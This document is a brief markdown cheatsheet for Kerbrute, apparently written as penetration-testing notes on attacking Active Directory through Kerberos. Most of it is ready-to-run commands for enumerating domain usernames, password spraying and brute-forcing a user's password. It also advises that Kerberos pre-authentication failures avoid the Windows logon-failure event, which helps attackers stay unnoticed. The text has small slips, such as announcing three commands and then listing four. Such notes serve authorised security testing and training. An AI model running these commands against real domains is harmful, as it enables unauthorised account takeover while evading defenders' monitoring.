# Kerbrute Cheatsheet
 For more information on the mechanics of Kerberos  [[Active-Directory-Kerberos-Authenication-Defined]] and [[Attacking-Kerberos]].
 
Kerbrute go install method `go install github.com/ropnop/kerbrute@latest`  
[Kerbrute precompiled](https://github.com/ropnop/kerbrute/releases)

Kerbrute has three main commands:

-   **bruteuser** - Bruteforce a single user's password from a wordlist
-   **bruteforce** - Read username:password combos from a file or stdin and test them
-   **passwordspray** - Test a single password against a list of users
-   **userenum** - Enumerate valid domain usernames via Kerberos
`kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local /path/to/wordlist/usernames.txt`


Bruteforcing Windows passwords with Kerberos is much faster than any other approach and potentially stealthier since pre-authentication failures do not trigger that  "traditional" An account failed to log on event 4625. With Kerberos, you can validate  # a username or test a login by only sending one UDP frame to the KDC (Domain Controller) 

```bash
# User enum (valid/invalid) 
./kerbrute_linux_amd64 userenum  -dc dc-domain -d lab.ropnop.com usernames.txt  
# Password spraying 
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com domain_users.txt Password123  # Brute force one user (take care of policy!) 
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com passwords.lst thoffman  
# General bruteforce (from username:password wordlist or from stdin) 
./kerbrute -d lab.ropnop.com bruteforce -`
```

## References

[Haak9](https://cheatsheet.haax.fr/windows-systems/exploitation/kerberos/)